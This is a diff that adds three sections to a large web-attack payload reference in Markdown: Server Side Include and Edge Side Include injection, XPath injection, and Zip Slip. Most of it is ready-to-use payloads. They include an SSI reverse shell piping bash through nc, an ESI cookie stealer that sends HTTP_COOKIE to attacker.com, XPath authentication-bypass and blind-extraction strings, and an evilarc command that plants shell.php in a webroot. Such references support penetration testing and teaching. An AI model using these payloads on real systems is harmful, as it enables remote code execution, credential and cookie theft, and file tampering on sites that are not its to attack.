@@ -4061,3 +4061,189 @@ Since the browser only sent one request, it accepts the response to the `HEAD` r
 * [PortSwigger - Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
 * [PortSwigger - Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)
 
+
+# Server Side Include Injection
+
+> Server Side Includes (SSI) are directives that are placed in HTML pages and evaluated on the server while the pages are being served. They let you add dynamically generated content to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.
+
+## Summary
+
+* [Methodology](#methodology)
+* [Edge Side Inclusion](#edge-side-inclusion)
+* [References](#references)
+
+## Methodology
+
+SSI Injection occurs when an attacker can input Server Side Include directives into a web application. SSIs are directives that can include files, execute commands, or print environment variables/attributes. If user input is not properly sanitized within an SSI context, this input can be used to manipulate server-side behavior and access sensitive information or execute commands.
+
+SSI format: `<!--#directive param="value" -->`
+
+| Description             | Payload                                  |
+| ----------------------- | ---------------------------------------- |
+| Print the date          | `<!--#echo var="DATE_LOCAL" -->`         |
+| Print the document name | `<!--#echo var="DOCUMENT_NAME" -->`      |
+| Print all the variables | `<!--#printenv -->`                      |
+| Setting variables       | `<!--#set var="name" value="Rich" -->`   |
+| Include a file          | `<!--#include file="/etc/passwd" -->`    |
+| Include a file          | `<!--#include virtual="/index.html" -->` |
+| Execute commands        | `<!--#exec cmd="ls" -->`                 |
+| Reverse shell           | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |
+
+## Edge Side Inclusion
+
+HTTP surrogates cannot differentiate between genuine ESI tags from the upstream server and malicious ones embedded in the HTTP response. This means that if an attacker manages to inject ESI tags into the HTTP response, the surrogate will process and evaluate them without question, assuming they are legitimate tags originating from the upstream server.
+
+Some surrogates will require ESI handling to be signaled in the Surrogate-Control HTTP header.
+
+```ps1
+Surrogate-Control: content="ESI/1.0"
+```
+
+| Description             | Payload                                  |
+| ----------------------- | ---------------------------------------- |
+| Blind detection         | `<esi:include src=http://attacker.com>`  |
+| XSS                     | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |
+| Cookie stealer          | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
+| Include a file          | `<esi:include src="supersecret.txt">` |
+| Display debug info      | `<esi:debug/>` |
+| Add header              | `<!--esi $add_header('Location','http://attacker.com') -->` |
+| Inline fragment         | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |
+
+| Software | Includes | Vars | Cookies | Upstream Headers Required | Host Whitelist |
+| -------- | -------- | ---- | ------- | ------------------------- | -------------- |
+| Squid3   | Yes      | Yes  | Yes     | Yes                       | No             |
+| Varnish Cache | Yes | No   | No      | Yes                       | Yes            |
+| Fastly   | Yes      | No   | No      | No                        | Yes            |
+| Akamai ESI Test Server (ETS) | Yes | Yes | Yes | No              | No             |
+| NodeJS' esi | Yes   | Yes  | Yes     | No                        | No             |
+| NodeJS' nodesi | Yes | No  | No      | No                        | Optional       |
+
+
+# XPATH Injection
+
+> XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.
+
+## Summary
+
+* [Tools](#tools)
+* [Methodology](#methodology)
+    * [Blind Exploitation](#blind-exploitation)
+    * [Out Of Band Exploitation](#out-of-band-exploitation)
+* [Labs](#labs)
+* [References](#references)
+
+## Tools
+
+* [orf/xcat](https://github.com/orf/xcat) - Automate XPath injection attacks to retrieve documents
+* [feakk/xxxpwn](https://github.com/feakk/xxxpwn) - Advanced XPath Injection Tool
+* [aayla-secura/xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - A fork of xxxpwn using predictive text
+* [micsoftvn/xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
+* [Harshal35/XmlChor](https://github.com/Harshal35/XMLCHOR) - Xpath injection exploitation tool
+
+## Methodology
+
+Similar to SQL injection, you want to terminate the query properly:
+
+```ps1
+string(//user[name/text()='" +vuln_var1+ "' and password/text()='" +vuln_var1+ "']/account/text())
+```
+
+```sql
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+')] | //user/*[contains(*,'
+') and contains(../password,'c
+') and starts-with(../password,'c
+```
+
+### Blind Exploitation
+
+1. Size of a string
+
+    ```sql
+    and string-length(account)=SIZE_INT
+    ```
+
+2. Access a character with `substring`, and verify its value the `codepoints-to-string` function
+
+    ```sql
+    substring(//user[userid=5]/username,2,1)=CHAR_HERE
+    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
+    ```
+
+### Out Of Band Exploitation
+
+```powershell
+http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
+```
+
+## Labs
+
+* [Root Me - XPath injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Authentication)
+* [Root Me - XPath injection - String](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-String)
+* [Root Me - XPath injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Blind)
+
+## References
+
+* [Places of Interest in Stealing NetNTLM Hashes - Osanda Malith Jayathissa - March 24, 2017](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
+* [XPATH Injection - OWASP - January 21, 2015](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
+
+# Zip Slip
+
+> The vulnerability is exploited using a specially crafted archive that holds directory traversal filenames (e.g. ../../shell.php). The Zip Slip vulnerability can affect numerous archive formats, including tar, jar, war, cpio, apk, rar and 7z. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim’s machine.
+
+## Summary
+
+* [Tools](#tools)
+* [Methodology](#methodology)
+* [References](#references)
+
+## Tools
+
+* [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc) - Create tar/zip archives that can exploit directory traversal vulnerabilities
+* [usdAG/slipit](https://github.com/usdAG/slipit) - Utility for creating ZipSlip archives
+
+## Methodology
+
+The Zip Slip vulnerability is a critical security flaw that affects the handling of archive files, such as ZIP, TAR, or other compressed file formats. This vulnerability allows an attacker to write arbitrary files outside of the intended extraction directory, potentially overwriting critical system files, executing malicious code, or gaining unauthorized access to sensitive information.
+
+**Example**: Suppose an attacker creates a ZIP file with the following structure:
+
+```ps1
+malicious.zip
+  ├── ../../../../etc/passwd
+  ├── ../../../../usr/local/bin/malicious_script.sh
+```
+
+When a vulnerable application extracts `malicious.zip`, the files are written to `/etc/passwd` and /`usr/local/bin/malicious_script.sh` instead of being contained within the extraction directory. This can have severe consequences, such as corrupting system files or executing malicious scripts.
+
+* Using [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc):
+
+    ```python
+    python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
+    ```
+
+* Creating a ZIP archive containing a symbolic link:
+
+    ```ps1
+    ln -s ../../../index.php symindex.txt
+    zip --symlinks test.zip symindex.txt
+    ```
+
+For a list of affected libraries and projects, visit [snyk/zip-slip-vulnerability](https://github.com/snyk/zip-slip-vulnerability)
+
+## References
+
+* [Zip Slip - Snyk - June 5, 2018](https://github.com/snyk/zip-slip-vulnerability)
+* [Zip Slip Vulnerability - Snyk - April 15, 2018](https://snyk.io/research/zip-slip-vulnerability)
